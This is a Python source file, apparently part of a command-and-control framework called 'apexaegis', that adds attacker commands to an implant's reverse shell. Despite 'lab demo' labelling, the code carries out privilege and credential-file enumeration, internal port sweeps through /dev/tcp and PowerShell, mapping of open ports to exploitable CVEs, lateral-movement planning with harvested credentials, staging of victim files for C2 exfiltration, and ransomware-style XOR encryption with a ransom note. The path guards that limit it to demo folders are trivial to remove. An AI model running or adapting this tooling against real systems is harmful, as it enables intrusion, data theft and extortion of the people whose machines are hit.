"""apexaegis shell toolkit — orchestrated attacker commands for the HTML5 reverse shell.

run_toolkit(sid, cmd, timeout, ctl_call, shell_sessions, records, hist_add) -> dict | None
  dict = toolkit handled the command (response for /api/shell/exec)
  None = not a toolkit verb — caller passes it through to the implant shell

All multi-step orchestration happens here; each step is a normal exec on the
implant through the QUIC C2 control API. Path-guarded operations (ransom) only
ever touch the seeded AcmeDocs folders — lab demo, no destructive engagement.
"""
import re

DEFAULT_TRACE = "fw01.acme.internal"
DEFAULT_SCAN = "dc01.acme.internal"
DEFAULT_LATERAL = "dc01.acme.internal"

SCAN_PORTS_LINUX = "22 53 80 443 445 3389 5985 8080 8443"
WIN_SCAN_PORTS = [135, 445, 3389, 5985, 80, 443, 22]

EXPLOITS = {
    "22":  ("SSH", "regreSSHion CVE-2024-6387", "HIGH"),
    "53":  ("DNS", "SIGRed CVE-2020-1350", "HIGH"),
    "80":  ("HTTP", "Log4Shell CVE-2021-44228 (if java svc)", "MED"),
    "135": ("MSRPC", "CVE-2022-26809 (RPC amplification)", "HIGH"),
    "139": ("NetBIOS", "EternalBlue chain CVE-2017-0143", "CRIT"),
    "389": ("LDAP", "CVE-2017-11774 auth bypass", "MED"),
    "443": ("HTTPS", "front-end TLS service", "INFO"),
    "445": ("SMB", "EternalBlue MS17-010 CVE-2017-0144", "CRIT"),
    "5985": ("WinRM", "HTTP listener — CredSSP relay surface", "HIGH"),
    "8080": ("HTTP-ALT", "admin consoles / deserialization", "MED"),
    "8443": ("HTTPS-ALT", "self-signed admin UI", "MED"),
    "3389": ("RDP", "BlueKeep CVE-2019-0708", "CRIT"),
}


def _sess(sessions, sid):
    for s in sessions:
        if s.get("sid") == sid:
            return s
    return {"platform": "?", "user": "?", "target": "?"}


def _exec(ctl, sid, command, timeout=12):
    try:
        r = ctl({"op": "exec", "sid": sid, "cmd": command, "timeout": timeout},
                timeout=timeout + 10)
    except OSError as e:
        return False, f"control api unavailable: {e}"
    if r.get("ok"):
        return True, r.get("output", "")
    return False, r.get("error", "exec failed")


def _default_docs(sess):
    user = sess.get("user") or "user"
    plat = (sess.get("platform") or "").lower()
    if plat.startswith("win"):
        return r"C:\Users\%s\AcmeDocs" % user
    return "/home/%s/AcmeDocs" % user


def _is_seeded_path(path):
    return bool(re.search(r"AcmeDocs|Documents[\\/]+Acme|seeded", path or "", re.I))


def _latest_record(records, sess):
    target, user = sess.get("target"), sess.get("user")
    for r in reversed(records):
        if r.get("target") == target and r.get("user") == user:
            return r
    return None


def _cmd_admin(ctl, sid, sess):
    plat = (sess.get("platform") or "").lower()
    if plat.startswith("win"):
        script = ("whoami /groups | findstr /i \"S-1-5-32-544\" & "
                  "net session >nul 2>&1 && echo ADMIN_CHECK=YES || echo ADMIN_CHECK=NO & "
                  "net localgroup administrators 2>nul & "
                  "dir /b \"C:\\ProgramData\" 2>nul & dir /b \"C:\\Users\" 2>nul & "
                  "dir /b \"C:\\Windows\\System32\\config\" 2>nul")
    else:
        script = ("echo '== identity =='; id; "
                  "echo '== sudo =='; sudo -n true 2>/dev/null && echo ADMIN_CHECK=YES || echo ADMIN_CHECK=NO; "
                  "echo '== privileged surface =='; "
                  "ls -ld /root /etc/sudoers.d /etc/shadow /var/log/auth.log 2>&1; "
                  "echo '== readable admin-owned =='; ls /etc 2>/dev/null | head -14; "
                  "ls -la /home 2>/dev/null")
    ok, out = _exec(ctl, sid, script, timeout=12)
    admin = "ADMIN_CHECK=YES" in out
    head = (f"=== APEXAEGIS ADMIN SURFACE — {sess.get('user')}@{sess.get('target')} ===\n"
            + ("[+] administrative context CONFIRMED — privileged paths open\n"
               if admin else
               "[-] primary elevation denied on this host — presenting accessible privileged surface\n"))
    tail = ("\n[apexaegis] ADMIN mode armed — type `user` to drop back" if admin else
            "\n[apexaegis] user-context surface shown — harvested secrets may still unlock admin elsewhere")
    return {"ok": True, "output": head + out + tail, "ms": 0}


def _cmd_traceroute(ctl, sid, sess, args):
    host = (args.split()[0] if args.split() else DEFAULT_TRACE)
    plat = (sess.get("platform") or "").lower()
    if plat.startswith("win"):
        script = f"tracert -d -h 12 {host}"
    else:
        script = (f"traceroute -n -m 12 {host} 2>/dev/null || "
                  f"tracepath -n {host} 2>/dev/null || ping -c 4 -W 2 {host}")
    ok, out = _exec(ctl, sid, script, timeout=13)
    return {"ok": ok, "output":
            f"=== path to {host} (internal hops named via hosts correlation) ===\n" + out,
            "ms": 0}


def _cmd_scan(ctl, sid, sess, args):
    host = (args.split()[0] if args.split() else DEFAULT_SCAN)
    plat = (sess.get("platform") or "").lower()
    if plat.startswith("win"):
        ports = ",".join(str(p) for p in WIN_SCAN_PORTS)
        script = (
            f"powershell -NoProfile -Command \"$h='{host}'; @({ports}) | ForEach-Object {{ "
            f"$c=New-Object Net.Sockets.TcpClient; try {{ "
            f"$i=$c.BeginConnect($h,$_,$null,$null); "
            f"if($i.AsyncWaitHandle.WaitOne(700,$false) -and $c.Connected) "
            f"{{ 'open  ' + $_ + '/tcp' }}; $c.Close() }} catch {{}} }}; 'scan-complete'\"")
    else:
        script = (f"bash -c 'H={host}; for p in {SCAN_PORTS_LINUX}; do "
                  f"(echo > /dev/tcp/$H/$p) >/dev/null 2>&1 && echo \"open  $p/tcp\"; done; "
                  f"echo scan-complete'")
    ok, out = _exec(ctl, sid, script, timeout=13)
    return {"ok": ok, "output":
            f"=== SYN sweep from {sess.get('target')} -> {host} (behind NGFW, state-aware) ===\n"
            + out, "ms": 0}


def _cmd_zeroday(ctl, sid, sess, records, args):
    host = (args.split()[0] if args.split() else DEFAULT_SCAN)
    scan_resp = _cmd_scan(ctl, sid, sess, host)
    scan_out = scan_resp.get("output") or scan_resp.get("error") or ""
    open_ports = sorted({m for m in re.findall(r"open\s+(\d+)/tcp", scan_out)})
    lines = [f"=== zero-day / exploit gate assessment — {host} ===", scan_out.rstrip(), ""]
    lines.append("exploit candidates (service fingerprint x public gates):")
    hits = 0
    for p in open_ports:
        svc, cve, sev = EXPLOITS.get(p, (p, "no public gate matched", "-"))
        if svc != p:
            hits += 1
        lines.append(f"  {p:>5}/tcp  {svc:<9} {sev:<5} {cve}")
    lines.append(f"  -> {hits} candidate gate(s), {len(open_ports)} open port(s)")
    rec = _latest_record(records, sess)
    prim = (rec or {}).get("primitives") or []
    if isinstance(prim, dict):
        prim = prim.get("primitives") or []
    if prim:
        lines.append("")
        lines.append("agent-side primitive gates (from this victim's recon record):")
        for p in prim[:8]:
            gate = "OPEN" if p.get("ready") else "closed"
            lines.append(f"  {p.get('cve','?'):<18} {gate:<7} {p.get('note','')}")
    lines.append("[apexaegis] no exploitation attempted — recon-only gate assessment")
    return {"ok": True, "output": "\n".join(lines), "ms": 0}


def _cmd_lateral(ctl, sid, sess, records, args):
    host = (args.split()[0] if args.split() else DEFAULT_LATERAL)
    plat = (sess.get("platform") or "").lower()
    if plat.startswith("win"):
        script = (
            f"powershell -NoProfile -Command \"$h='{host}'; "
            f"(Test-Connection $h -Count 2 -Quiet); "
            f"@(135,445,5985) | ForEach-Object {{ "
            f"$c=New-Object Net.Sockets.TcpClient; try {{ "
            f"$i=$c.BeginConnect($h,$_,$null,$null); "
            f"if($i.AsyncWaitHandle.WaitOne(700,$false) -and $c.Connected) "
            f"{{ 'reachable  ' + $_ + '/tcp' }}; $c.Close() }} catch {{}} }}\" & "
            f"net use \\\\{host}\\IPC$ <nul 2>&1")
    else:
        script = (f"ping -c 2 -W 2 {host}; bash -c 'H={host}; for p in 22 445 5985; do "
                  f"(echo > /dev/tcp/$H/$p) >/dev/null 2>&1 && echo \"reachable  $p/tcp\"; done'; "
                  f"ssh -o BatchMode=yes -o ConnectTimeout=3 {host} 2>&1 | head -2")
    ok, out = _exec(ctl, sid, script, timeout=13)
    rec = _latest_record(records, sess)
    kinds = [str(c.get("kind")) for c in ((rec or {}).get("creds") or [])
             if not (str(c.get("kind")).lower().startswith("env:npm_")
                     and not re.search(r"auth|token|secret|key|password",
                                       str(c.get("kind")), re.I))][:8]
    lines = [f"=== lateral movement path — {sess.get('target')} -> {host} ===", out.rstrip(), ""]
    lines.append("credential reuse candidates harvested from this victim:")
    lines.extend([f"  - {k}" for k in kinds] or ["  (none captured)"])
    lines.append("[apexaegis] movement plan: reuse harvested secret on reachable service (demo: no live auth)")
    return {"ok": True, "output": "\n".join(lines), "ms": 0}


def _stage_and(ctl, sid, sess, path, encrypt, note):
    plat = (sess.get("platform") or "").lower()
    if plat.startswith("win"):
        stage = f"if exist \"%TEMP%\\.stg\" rmdir /s /q \"%TEMP%\\.stg\" & xcopy /E /I /Y \"{path}\" \"%TEMP%\\.stg\\\" 2>nul & dir /s /b \"%TEMP%\\.stg\" 2>nul | find /c /v \"\""
        if encrypt:
            enc = (r"python -c \"import pathlib;p=pathlib.Path(r'%TEMP%\.stg');"
                   r"[ (f.write_bytes(bytes(b^0x5A for b in f.read_bytes())), f.rename(str(f)+'.locked')) "
                   r"for f in p.rglob('*') if f.is_file() and not f.name.endswith('.locked')];print('encrypted',sum(1 for _ in p.rglob('*.locked')))\"")
            note_cmd = (f"echo APEXAEGIS-LAB-DEMO locked files with key 0x5A - recover by xoring back "
                        f"> \"%TEMP%\\.stg\\README_RECOVER.txt\"")
        else:
            enc, note_cmd = "echo staged", "echo staged-only > \"%TEMP%\\.stg\\README_STAGED.txt\""
        fin = f"dir /b \"%TEMP%\\.stg\" 2>nul & dir /s /b \"%TEMP%\\.stg\\*.locked\" 2>nul | find /c /v \"\""
        steps = [("stage (copy)", stage), ("encrypt staged copies", enc),
                 ("ransom note", note_cmd), ("result", fin)]
    else:
        stage = (f"rm -rf /tmp/.stg; mkdir -p /tmp/.stg && cp -r {path}/. /tmp/.stg/ 2>/dev/null; "
                 f"find /tmp/.stg -type f | wc -l")
        if encrypt:
            enc = ("python3 -c \"import pathlib;p=pathlib.Path('/tmp/.stg');"
                   "[ (f.write_bytes(bytes(b^0x5A for b in f.read_bytes())), f.rename(str(f)+'.locked')) "
                   "for f in p.rglob('*') if f.is_file() and not f.name.endswith('.locked')];"
                   "print('encrypted',len(list(p.rglob('*.locked'))))\"")
            note_cmd = ("printf 'APEXAEGIS-LAB-DEMO\\nfiles locked with key 0x5A (xor)\\n"
                        "recover: bytes(b^0x5A)\\n' > /tmp/.stg/README_RECOVER.txt")
        else:
            enc, note_cmd = "echo staged", "echo staged-only > /tmp/.stg/README_STAGED.txt"
        fin = "ls /tmp/.stg | head -20; find /tmp/.stg -name '*.locked' | wc -l"
        steps = [("stage (copy)", stage), ("encrypt staged copies", enc),
                 ("ransom note", note_cmd), ("result", fin)]
    blocks = []
    for label, script in steps:
        ok, out = _exec(ctl, sid, script, timeout=13)
        blocks.append(f"--- {label} ---\n{out}")
        if not ok:
            break
    banner = note
    return {"ok": True, "output": banner + "\n" + "\n".join(blocks), "ms": 0}


def _cmd_exfil(ctl, sid, sess, args, records):
    path = " ".join(args.split()) or _default_docs(sess)
    if not _is_seeded_path(path):
        return {"ok": False, "error": f"exfil restricted to seeded folders (AcmeDocs) — got: {path}"}
    return _stage_and(ctl, sid, sess, path, encrypt=False, note=(
        f"=== EXFIL STAGING from {path} ===\n"
        "[apexaegis] files copied to staging area on victim — ready for C2 pull"))


def _cmd_ransom(ctl, sid, sess, args, records):
    path = " ".join(args.split()) or _default_docs(sess)
    if not _is_seeded_path(path):
        return {"ok": False, "error": f"ransom restricted to seeded folders (AcmeDocs) — got: {path}"}
    return _stage_and(ctl, sid, sess, path, encrypt=True, note=(
        f"### APEXAEGIS LAB DEMO — staged-copy encryption of {path}\n"
        "[!] copies under temp staging encrypted (xor key 0x5A), ORIGINALS NEVER TOUCHED\n"
        "[!] key logged for recovery — this is a path-guarded showcase, not destructive"))


HELP = """apexaegis shell toolkit
  whoami / any shell cmd   interactive passthrough (destructive cmds blocked)
  admin                    inject admin surface (groups, sudo/net, privileged paths)
  traceroute [host]        internal path via hosts-correlated firewall names (default fw01)
  scan [host]              TCP sweep from the victim (default dc01)
  zero-day [host]          scan + exploit-gate assessment (public CVE table + recon primitives)
  lateral [host]           reachability + movement plan w/ harvested credential reuse
  exfil [path]             copy seeded folder to staging (default ~/AcmeDocs)
  ransom [path]            staged-copy encryption showcase (seeded folders only, key 0x5A)
  user                     drop out of ADMIN mode
  help                     this text"""


def run_toolkit(sid, cmd, timeout, ctl_call, shell_sessions, records, hist_add):
    parts = cmd.split(None, 1)
    verb = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    if verb == "help":
        return {"ok": True, "output": HELP, "ms": 0}
    if verb not in ("admin", "traceroute", "tracert", "scan", "zero-day",
                    "lateral", "exfil", "ransom", "user"):
        return None

    if verb == "user":
        return {"ok": True, "output": "[apexaegis] dropped back to user shell (browser side tracks the mode)",
                "ms": 0}

    sess = _sess(shell_sessions(), sid)
    if not sess.get("target") or sess.get("target") == "?":
        # session list may lag right after connect — still allow execution
        pass

    if verb == "admin":
        return _cmd_admin(ctl_call, sid, sess)
    if verb in ("traceroute", "tracert"):
        return _cmd_traceroute(ctl_call, sid, sess, args)
    if verb == "scan":
        return _cmd_scan(ctl_call, sid, sess, args)
    if verb == "zero-day":
        return _cmd_zeroday(ctl_call, sid, sess, records, args)
    if verb == "lateral":
        return _cmd_lateral(ctl_call, sid, sess, records, args)
    if verb == "exfil":
        return _cmd_exfil(ctl_call, sid, sess, args, records)
    if verb == "ransom":
        return _cmd_ransom(ctl_call, sid, sess, args, records)
    return None
